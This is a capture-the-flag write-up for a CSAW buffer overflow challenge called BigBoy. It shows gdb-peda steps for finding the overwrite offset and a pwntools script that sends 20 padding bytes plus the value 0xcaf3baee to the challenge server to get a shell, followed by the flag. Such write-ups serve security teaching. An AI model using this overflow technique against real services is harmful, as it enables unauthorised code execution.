# BigBoy

![](https://i.imgur.com/diG7oLv.png)

This challenge is a bufferoverflow binary, we should determine the offset where the EAX register is compared and achieve the condition.

First, let's run gdb-peda and disassemble the main function.

```
$ gdb ./boi
```

![](https://i.imgur.com/evgFNXL.png)

Here's a `read()` function, then store the input into the EAX register and is compared to this hexadecimal value `0xcaf3baee` and finally it get a jump (jne).

If the condition is met, it will jump to the `rum_cmd` (main+122) function which will execute the shell.

![](https://i.imgur.com/t37Orrv.png)

After that, let's get started to determine the offset where the BufferOverflow's hexadecimal value is checked.

![](https://i.imgur.com/4eTvScs.png)

First, put a breakpoint after the `read()` function like: 
```
$ b *0x4006a8
```

Then generate a simple pattern (just make sure it is long enough):
```
$ pattern create 100
```

Run the binary and copy&paste the pattern as input when bonary require that.

![](https://i.imgur.com/AlAm9l6.png)

Then verify the value of `$eax` :
```
$ print $eax
$ pattern_offset 0xXXXXXXXX
```

After we got the offset, we could write down a python script to complete this PWN chal.

```python
from pwn import *

server = remote("pwn.chal.csaw.io",9000)
payload = "A"*20
payload += p32(0xcaf3baee)
server.sendline(payload)
server.interactive()
```

`FLAG : flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`